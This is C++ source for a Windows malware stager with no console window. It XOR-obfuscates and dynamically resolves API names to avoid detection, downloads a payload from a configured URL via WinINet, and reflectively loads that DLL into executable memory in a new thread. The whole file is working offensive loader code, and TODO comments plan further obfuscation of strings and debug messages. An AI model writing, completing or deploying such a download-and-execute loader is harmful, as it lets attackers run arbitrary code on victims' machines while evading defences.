#include "stager.h"
#include <iostream> // Temporary for debugging
#include <vector>
#include <wininet.h>
#include <string>    // Keep for std::string

// Global API pointer structure instance
StagerApiPointers g_api;

// --- XOR Obfuscation --- (Copied/adapted from cpp_injector)
// Simple XOR key
constexpr char XOR_KEY = 0xBB;

// Helper to create obfuscated char arrays (compile-time if possible, else runtime init)
// We need a way to pass the size correctly. Let's use a struct.
struct ObfuscatedData {
    const char* data;
    size_t size; // Size *without* null terminator
};

// Define obfuscated strings globally or statically
// NOTE: Manually calculating XORed chars is tedious and error-prone.
// A helper script or constexpr function would be better in a real project.
// For now, demonstrate with a few examples and use plain strings for others
// until a better obfuscation method (e.g., compile-time) is implemented.

// Example: Obfuscating "kernel32.dll" (12 chars)
constexpr char obs_kernel32_data[] = {
    'k' ^ XOR_KEY, 'e' ^ XOR_KEY, 'r' ^ XOR_KEY, 'n' ^ XOR_KEY, 'e' ^ XOR_KEY, 'l' ^ XOR_KEY,
    '3' ^ XOR_KEY, '2' ^ XOR_KEY, '.' ^ XOR_KEY, 'd' ^ XOR_KEY, 'l' ^ XOR_KEY, 'l' ^ XOR_KEY
};
const ObfuscatedData obs_kernel32 = { obs_kernel32_data, 12 };

// Example: Obfuscating "GetProcAddress" (14 chars)
constexpr char obs_GetProcAddress_data[] = {
    'G' ^ XOR_KEY, 'e' ^ XOR_KEY, 't' ^ XOR_KEY, 'P' ^ XOR_KEY, 'r' ^ XOR_KEY, 'o' ^ XOR_KEY,
    'c' ^ XOR_KEY, 'A' ^ XOR_KEY, 'd' ^ XOR_KEY, 'd' ^ XOR_KEY, 'r' ^ XOR_KEY, 'e' ^ XOR_KEY,
    's' ^ XOR_KEY, 's' ^ XOR_KEY
};
const ObfuscatedData obs_GetProcAddress = { obs_GetProcAddress_data, 14 };

// Example: Obfuscating "VirtualAlloc" (12 chars)
constexpr char obs_VirtualAlloc_data[] = {
    'V' ^ XOR_KEY, 'i' ^ XOR_KEY, 'r' ^ XOR_KEY, 't' ^ XOR_KEY, 'u' ^ XOR_KEY, 'a' ^ XOR_KEY,
    'l' ^ XOR_KEY, 'A' ^ XOR_KEY, 'l' ^ XOR_KEY, 'l' ^ XOR_KEY, 'o' ^ XOR_KEY, 'c' ^ XOR_KEY
};
const ObfuscatedData obs_VirtualAlloc = { obs_VirtualAlloc_data, 12 };

// ... Add all other required strings here ...
// For now, we will keep using plain strings for the rest and mark TODOs

// Runtime deobfuscation helper
std::string Deobfuscate(const ObfuscatedData& obsData) {
    std::string deobfuscated_str;
    deobfuscated_str.reserve(obsData.size);
    for (size_t i = 0; i < obsData.size; ++i) {
        deobfuscated_str += obsData.data[i] ^ XOR_KEY;
    }
    return deobfuscated_str;
}

// Macro for easy API calls through the structure
#define API(FUNC) g_api.Real##FUNC
#define CRT(FUNC) g_api.Real_##FUNC

// Initialization function for API pointers
bool InitializeStagerApiPointers() {
    // Use Deobfuscate for the bootstrapped functions
    char szGetProcAddress[15]; // Need buffer for null terminator
    std::string temp = Deobfuscate(obs_GetProcAddress);
    CRT(memcpy)(szGetProcAddress, temp.c_str(), 14); // Manual copy + null term
    szGetProcAddress[14] = '\0';

    // TODO: Obfuscate "kernel32.dll" for GetModuleHandleW if needed, currently uses wide char
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll"); // Use direct call ONLY for this bootstrap
    if (!hKernel32) return false;

    // Get GetProcAddress first using direct call + deobfuscated name
    g_api.RealGetProcAddress = (GetProcAddress_t)GetProcAddress(hKernel32, szGetProcAddress);
    if (!g_api.RealGetProcAddress) return false;

    // TODO: Obfuscate "LoadLibraryA"
    const char* szLoadLibraryA = "LoadLibraryA";
    g_api.RealLoadLibraryA = (LoadLibraryA_t)API(GetProcAddress)(hKernel32, szLoadLibraryA);
    if (!g_api.RealLoadLibraryA) return false;

    // Now load libraries and resolve other functions using the pointers
    // Use Deobfuscate for library names
    std::string sKernel32 = Deobfuscate(obs_kernel32);
    HMODULE hKernel32Loaded = API(LoadLibraryA)(sKernel32.c_str());
    if (!hKernel32Loaded) return false;

    // TODO: Obfuscate "wininet.dll"
    const char* szWininet = "wininet.dll";
    HMODULE hWininetLoaded = API(LoadLibraryA)(szWininet);
    if (!hWininetLoaded) return false;

    // Resolve Kernel32 functions (Use Deobfuscate for names)
    #define GET_API(DLL_HANDLE, VAR_NAME, OBFUSCATED_DATA, TYPE) \\\
        do { \\\
            std::string funcName = Deobfuscate(OBFUSCATED_DATA); \\\
            VAR_NAME = (TYPE)API(GetProcAddress)(DLL_HANDLE, funcName.c_str()); \\\
        } while(0)

    // Example using the macro (replace direct assignments)
    // GET_API(hKernel32Loaded, g_api.RealVirtualAlloc, obs_VirtualAlloc, VirtualAlloc_t);

    // TODO: Obfuscate all function names and use Deobfuscate() or GET_API macro
    g_api.RealFreeLibrary = (FreeLibrary_t)API(GetProcAddress)(hKernel32Loaded, "FreeLibrary");
    g_api.RealVirtualAlloc = (VirtualAlloc_t)API(GetProcAddress)(hKernel32Loaded, Deobfuscate(obs_VirtualAlloc).c_str()); // Example usage
    g_api.RealVirtualFree = (VirtualFree_t)API(GetProcAddress)(hKernel32Loaded, "VirtualFree");
    g_api.RealVirtualProtect = (VirtualProtect_t)API(GetProcAddress)(hKernel32Loaded, "VirtualProtect");
    g_api.RealCreateThread = (CreateThread_t)API(GetProcAddress)(hKernel32Loaded, "CreateThread");
    g_api.RealSleep = (Sleep_t)API(GetProcAddress)(hKernel32Loaded, "Sleep");
    g_api.RealOutputDebugStringA = (OutputDebugStringA_t)API(GetProcAddress)(hKernel32Loaded, "OutputDebugStringA");
    g_api.RealGetLastError = (GetLastError_t)API(GetProcAddress)(hKernel32Loaded, "GetLastError");
    g_api.RealGetModuleHandleW = (GetModuleHandleW_t)API(GetProcAddress)(hKernel32Loaded, "GetModuleHandleW");
    g_api.Real_memcpy = (memcpy_t)API(GetProcAddress)(hKernel32Loaded, "memcpy");
    g_api.Real_strcmp = (strcmp_t)API(GetProcAddress)(hKernel32Loaded, "strcmp");
    g_api.Real_wsprintfA = (wsprintfA_t)API(GetProcAddress)(hKernel32Loaded, "wsprintfA");

    // Resolve WinINet functions (Use Deobfuscate for names)
    if (hWininetLoaded) {
        // TODO: Obfuscate WinINet function names
        g_api.RealInternetOpenW = (InternetOpenW_t)API(GetProcAddress)(hWininetLoaded, "InternetOpenW");
        g_api.RealInternetOpenUrlW = (InternetOpenUrlW_t)API(GetProcAddress)(hWininetLoaded, "InternetOpenUrlW");
        g_api.RealInternetReadFile = (InternetReadFile_t)API(GetProcAddress)(hWininetLoaded, "InternetReadFile");
        g_api.RealInternetCloseHandle = (InternetCloseHandle_t)API(GetProcAddress)(hWininetLoaded, "InternetCloseHandle");
        g_api.RealHttpQueryInfoW = (HttpQueryInfoW_t)API(GetProcAddress)(hWininetLoaded, "HttpQueryInfoW");
    }

    // Simple validation
    if (!g_api.RealVirtualAlloc || !g_api.RealCreateThread || !g_api.RealInternetOpenW || !g_api.RealInternetReadFile || !g_api.Real_memcpy || !g_api.Real_strcmp) {
        return false;
    }

    return true;
}

// Function to fetch payload from a URL
bool FetchPayload(LPCWSTR url, std::vector<BYTE>& payloadData) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    BOOL bResult = FALSE;
    DWORD dwBytesRead = 0;
    DWORD dwContentLength = 0;
    DWORD dwSize = sizeof(dwContentLength);
    std::vector<BYTE> buffer(4096); // Initial buffer size

    // Initialize WinINet
    hInternet = API(InternetOpenW)(L"Stager/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        API(OutputDebugStringA)("InternetOpenW failed\n");
        return false;
    }

    // Open the URL
    hConnect = API(InternetOpenUrlW)(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        API(OutputDebugStringA)("InternetOpenUrlW failed\n");
        API(InternetCloseHandle)(hInternet);
        return false;
    }

    // Optional: Get content length to potentially pre-allocate vector size
    // This might fail or return 0, so we still need the loop
    API(HttpQueryInfoW)(hConnect, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &dwContentLength, &dwSize, NULL);
    if (dwContentLength > 0) {
        try {
            payloadData.reserve(dwContentLength);
        } catch (const std::bad_alloc&) {
             API(OutputDebugStringA)("Failed to reserve memory for payload\n");
             // Continue anyway, vector will grow
        }
    }

    // Read data in chunks
    while (API(InternetReadFile)(hConnect, buffer.data(), buffer.size(), &dwBytesRead) && dwBytesRead > 0) {
        payloadData.insert(payloadData.end(), buffer.begin(), buffer.begin() + dwBytesRead);
    }
    // Check if the loop exited because of an error or end of file
    DWORD lastError = API(GetLastError)();
    if (lastError != ERROR_SUCCESS && lastError != ERROR_INTERNET_CONNECTION_ABORTED) { // Aborted is ok if server closes connection
        if (dwBytesRead == 0 && payloadData.empty()){ // Check if read failed immediately
             API(OutputDebugStringA)("InternetReadFile failed immediately or returned 0 bytes\n");
              bResult = false;
        } else {
            // We read some data, maybe it's ok? Or maybe truncated.
            // For simplicity, assume success if we read anything.
            // More robust checking might be needed.
            API(OutputDebugStringA)("InternetReadFile finished (might be error or EOF)\n");
            bResult = true; // Assume success if some bytes were read
        }

    } else {
        bResult = true; // Successful read completion
    }

    // Cleanup
    API(InternetCloseHandle)(hConnect);
    API(InternetCloseHandle)(hInternet);

    return bResult && !payloadData.empty();
}

// Function to execute a Reflective DLL from memory
bool ExecutePayloadReflective(const std::vector<BYTE>& payloadData) {
    if (payloadData.empty()) {
        API(OutputDebugStringA)("ExecutePayloadReflective: Payload data is empty.\n");
        return false;
    }

    const BYTE* pPayloadData = payloadData.data();
    DWORD dwPayloadSize = static_cast<DWORD>(payloadData.size());

    // Basic PE header validation
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPayloadData;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        API(OutputDebugStringA)("ExecutePayloadReflective: Invalid DOS signature.\n");
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPayloadData + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        API(OutputDebugStringA)("ExecutePayloadReflective: Invalid NT signature.\n");
        return false;
    }

    // Check architecture compatibility (optional but good practice)
#ifdef _WIN64
    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        API(OutputDebugStringA)("ExecutePayloadReflective: Architecture mismatch (expected x64).\n");
        return false;
    }
#else
    if (pNtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        API(OutputDebugStringA)("ExecutePayloadReflective: Architecture mismatch (expected x86).\n");
        return false;
    }
#endif

    // --- Find ReflectiveLoader export --- 
    FARPROC pReflectiveLoader = NULL;
    DWORD dwReflectiveLoaderRVA = 0;
    // TODO: Obfuscate "ReflectiveLoader"
    const char* reflectiveLoaderName = "ReflectiveLoader";
    std::string sReflectiveLoaderName = reflectiveLoaderName; // Deobfuscate here if needed

    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) {
         API(OutputDebugStringA)("ExecutePayloadReflective: No export directory found.\n");
         return false;
    }

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPayloadData + exportDir.VirtualAddress);
    PDWORD pNameRVAs = (PDWORD)(pPayloadData + pExportDir->AddressOfNames);
    PDWORD pFunctionRVAs = (PDWORD)(pPayloadData + pExportDir->AddressOfFunctions);
    PWORD pOrdinalRVAs = (PWORD)(pPayloadData + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i) {
        const char* currentName = (const char*)(pPayloadData + pNameRVAs[i]);
        // Use dynamic strcmp with deobfuscated name if necessary
        if (CRT(strcmp)(currentName, sReflectiveLoaderName.c_str()) == 0) {
            WORD ordinal = pOrdinalRVAs[i];
            dwReflectiveLoaderRVA = pFunctionRVAs[ordinal];
            // TODO: Obfuscate debug string
            API(OutputDebugStringA)("ExecutePayloadReflective: Found ReflectiveLoader export.\n");
            break;
        }
    }

    if (dwReflectiveLoaderRVA == 0) {
        // TODO: Obfuscate debug string
        API(OutputDebugStringA)("ExecutePayloadReflective: ReflectiveLoader export not found.\n");
        return false;
    }

    // --- Allocate memory for the DLL --- 
    // Allocate memory in the *current* process for simplicity first.
    // Use the size from OptionalHeader.SizeOfImage.
    // Use MEM_COMMIT | MEM_RESERVE. Permissions RWX for now (bad practice, fix later).
    LPVOID pAllocatedBase = API(VirtualAlloc)(NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocatedBase) {
        API(OutputDebugStringA)("ExecutePayloadReflective: VirtualAlloc failed.\n");
        return false;
    }
    API(OutputDebugStringA)("ExecutePayloadReflective: Memory allocated.\n");

    // --- Manually map the PE into allocated memory --- 
    // 1. Copy PE Headers
    CRT(memcpy)(pAllocatedBase, pPayloadData, pNtHeaders->OptionalHeader.SizeOfHeaders);
    API(OutputDebugStringA)("ExecutePayloadReflective: PE Headers copied.\n");

    // 2. Copy Sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
        LPVOID pSectionDest = (LPBYTE)pAllocatedBase + pSectionHeader[i].VirtualAddress;
        LPVOID pSectionSrc = (LPBYTE)pPayloadData + pSectionHeader[i].PointerToRawData;
        DWORD dwSectionSize = pSectionHeader[i].SizeOfRawData;
        if (dwSectionSize > 0) {
             CRT(memcpy)(pSectionDest, pSectionSrc, dwSectionSize);
        }
    }
    API(OutputDebugStringA)("ExecutePayloadReflective: PE Sections copied.\n");

    // --- Set Memory Protections --- 
    DWORD dwOldProtect = 0;
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; ++i) {
        LPVOID pSectionBase = (LPBYTE)pAllocatedBase + pSectionHeader[i].VirtualAddress;
        SIZE_T sizeOfSection = pSectionHeader[i].Misc.VirtualSize;
        DWORD characteristics = pSectionHeader[i].Characteristics;
        DWORD dwNewProtect = 0;

        if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                dwNewProtect = PAGE_EXECUTE_READWRITE; // Should be rare
            } else if (characteristics & IMAGE_SCN_MEM_READ) {
                 dwNewProtect = PAGE_EXECUTE_READ;
            } else {
                 dwNewProtect = PAGE_EXECUTE;
            }
        } else {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                 dwNewProtect = PAGE_READWRITE;
            } else if (characteristics & IMAGE_SCN_MEM_READ) {
                 dwNewProtect = PAGE_READONLY;
            } else {
                dwNewProtect = PAGE_NOACCESS; // No explicit read/write/execute
            }
        }

        if (sizeOfSection > 0) {
             if (!API(VirtualProtect)(pSectionBase, sizeOfSection, dwNewProtect, &dwOldProtect)) {
                  API(OutputDebugStringA)("ExecutePayloadReflective: VirtualProtect failed for section.\n");
                  // Consider cleanup and return false, but for now just log
             }
        }
    }
    API(OutputDebugStringA)("ExecutePayloadReflective: Memory protections set.\n");

    // --- Execute ReflectiveLoader --- 
    pReflectiveLoader = (FARPROC)((LPBYTE)pAllocatedBase + dwReflectiveLoaderRVA);

    // TODO: Obfuscate debug string
    API(OutputDebugStringA)("ExecutePayloadReflective: Executing ReflectiveLoader...\n");

    // Create a thread to run the ReflectiveLoader
    // Pass the base address of the allocated memory to the loader function
    HANDLE hThread = API(CreateThread)(NULL, 0, (LPTHREAD_START_ROUTINE)pReflectiveLoader, pAllocatedBase, 0, NULL);
    if (!hThread) {
        // TODO: Obfuscate debug string
        API(OutputDebugStringA)("ExecutePayloadReflective: CreateThread failed.\n");
        API(VirtualFree)(pAllocatedBase, 0, MEM_RELEASE); // Clean up allocated memory
        return false;
    }

    // TODO: Obfuscate debug string
    API(OutputDebugStringA)("ExecutePayloadReflective: ReflectiveLoader thread created successfully.\n");
    return true;
}

// Entry point for a Windows application without a console window
// (More stealthy than a standard console main)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Initialize API pointers first!
    if (!InitializeStagerApiPointers()) {
        // Cannot even call OutputDebugStringA here easily
        return -1; // Critical failure
    }

    // 1. Initialization
    API(OutputDebugStringA)("Stager started... API Initialized.\n");

    // 2. Fetch Payload
    std::vector<BYTE> payloadBytes;
    API(OutputDebugStringA)("Fetching payload...\n");
    if (!FetchPayload(PAYLOAD_URL, payloadBytes)) {
        API(OutputDebugStringA)("Failed to fetch payload.\n");
        return 1; // Exit if fetching fails
    }
    API(OutputDebugStringA)("Payload fetched successfully.\n");
    // Optional: Output payload size for debugging
    char sizeMsg[100];
    // Use dynamic wsprintfA
    CRT(wsprintfA)(sizeMsg, "Payload size: %lu bytes\n", static_cast<unsigned long>(payloadBytes.size()));
    // TODO: Obfuscate format string "Payload size: %lu bytes\n"
    API(OutputDebugStringA)(sizeMsg);

    // 3. Execute Payload
    API(OutputDebugStringA)("Executing payload reflectively...\n");
    if (!ExecutePayloadReflective(payloadBytes)) {
        API(OutputDebugStringA)("Failed to execute payload reflectively.\n");
        return 1; // Exit if execution fails
    }
    API(OutputDebugStringA)("Payload execution (reflective load) initiated successfully.\n");

    // 4. Cleanup (if necessary)
    // Payload memory (`payloadBytes`) is managed by std::vector and cleaned up automatically.
    API(OutputDebugStringA)("Stager finished (payload execution pending).\n");

    // Normally, the stager might exit here, or the executed payload takes over.
    return 0; // Successful exit (or payload determines fate)
}

// Optional: Standard main for console debugging (use different build config)
// int main() {
//     return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWDEFAULT);
// } 